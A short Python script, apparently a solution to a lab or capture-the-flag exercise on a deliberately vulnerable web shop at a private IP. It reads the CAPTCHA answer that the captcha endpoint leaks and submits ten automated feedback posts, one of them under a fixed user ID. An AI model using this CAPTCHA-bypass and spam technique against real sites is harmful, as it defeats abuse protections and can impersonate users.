import requests

BASE_URL = 'http://192.168.159.128:3000'

for _ in range(10):
    response = requests.get(BASE_URL + '/rest/captcha/')
    print(response.json())
    id = response.json()['captchaId']
    captcha = response.json()['answer']
    payload = {"UserId":22,"captchaId":id,"captcha":captcha,"comment":"my feedback (***ail.ru)","rating":5}
    response = requests.post(BASE_URL + '/api/Feedbacks/', json=payload, timeout=5)
    print(response.text)
